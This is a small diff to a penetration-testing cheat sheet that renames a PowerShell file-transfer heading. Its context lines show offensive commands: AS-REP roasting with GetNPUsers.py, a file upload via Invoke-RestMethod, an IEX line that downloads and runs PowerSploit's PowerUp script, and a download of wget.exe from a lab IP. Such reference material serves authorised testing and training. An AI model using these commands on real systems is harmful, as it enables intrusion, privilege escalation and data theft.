@@ -425,7 +425,7 @@ PHP:
    `# python3 GetNPUsers.py <domainname>/ -usersfile /root/Desktop/adusers.txt -dc-ip <dcip>`   
 
 ## File Transfer
-### PowerShell
+### PowerShell File Download
 - `Invoke-RestMethod -Uri $uri -Method Post -InFile $uploadPath -UseDefaultCredentials` 
 - `IEX ((New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"))`  
 - `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"`  
